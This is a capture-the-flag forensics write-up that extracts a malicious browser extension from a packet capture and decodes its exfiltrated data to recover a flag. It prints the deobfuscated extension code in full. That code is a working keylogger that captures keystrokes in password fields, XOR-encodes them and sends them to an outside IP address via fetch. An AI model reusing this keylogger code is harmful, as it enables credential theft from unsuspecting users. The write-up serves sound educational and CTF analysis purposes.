<img width="799" height="302" alt="image" src="https://github.com/user-attachments/assets/83b71109-61e7-4732-9042-e13374c9216d" />  

Receiving pcap file, open it and checking, we can see some file can export:  

<img width="750" height="546" alt="image" src="https://github.com/user-attachments/assets/75380922-ad04-452a-aad8-710ef70b6327" />  

Extract all and see what `.rcx` file (google extension file) do. Rename it to `.zip` and using `binwalk` to extract, we receive 2 file.  

<img width="1457" height="98" alt="image" src="https://github.com/user-attachments/assets/243ac7dc-8037-4291-990a-78c07b0b6506" />  

<img width="555" height="505" alt="image" src="https://github.com/user-attachments/assets/4f6cd6c8-3335-40c7-92b4-2b52d5ccaae6" />  

First js file is obfucated, deobfucated it and we know it is keylogger do the XOR with some data (arcording to chat lol)  
```python
function getKey() {
  const _0x3733b8 = new Date().getUTCMinutes();
  return String.fromCharCode(_0x3733b8 + 0x20);
}
function xorEncrypt(_0x2d1e8c, _0x3beac1) {
  let _0x406d63 = '';
  for (let _0x58a85f = 0x0; _0x58a85f < _0x2d1e8c.length; _0x58a85f++) {
    const _0x384e0a = _0x2d1e8c.charCodeAt(_0x58a85f);
    const _0x4250be = _0x3beac1.charCodeAt(0x0);
    const _0x4df57c = _0x384e0a ^ _0x4250be;
    _0x406d63 += _0x4df57c.toString(0x10).padStart(0x2, '0');
  }
  return _0x406d63;
}
document.addEventListener("keydown", _0x4e7994 => {
  const _0x260e7d = _0x4e7994.target;
  if (_0x260e7d.type === 'password') {
    const _0x2c5a17 = _0x4e7994.key.length === 0x1 ? _0x4e7994.key : '';
    const _0x5e96ad = getKey();
    const _0x5a4007 = xorEncrypt(_0x2c5a17, _0x5e96ad);
    const _0x3a36f2 = encodeURIComponent(_0x5a4007);
    if (_0x2c5a17) {
      fetch('http://192.9.137.137:42552/?t=' + _0x3a36f2);
    }
  }
});
```
We also have the data from Wireshark above: 
```
5e 54 43 51 4c 52 4f 43 52 59 44 5e 58 59 44 68 5a 5e 50 5f 43 68 5d 42 44 43 68 44 42 54 5c 4a
```

Python script to find the key and brute-force to get the flag:
```python
data_hex = "5e 54 43 51 4c 52 4f 43 52 59 44 5e 58 59 44 68 5a 5e 50 5f 43 68 5d 42 44 43 68 44 42 54 5c 4a"
data_bytes = bytes.fromhex(data_hex)

for k in range(32, 92):  # key = minutes + 32
    decoded = ''.join([chr(b ^ k) for b in data_bytes])
    if 'ictf' in decoded:  
        print(f"Key: {k} -> {decoded}")
```
> Flag: ictf{extensions_might_just_suck}

Peace!










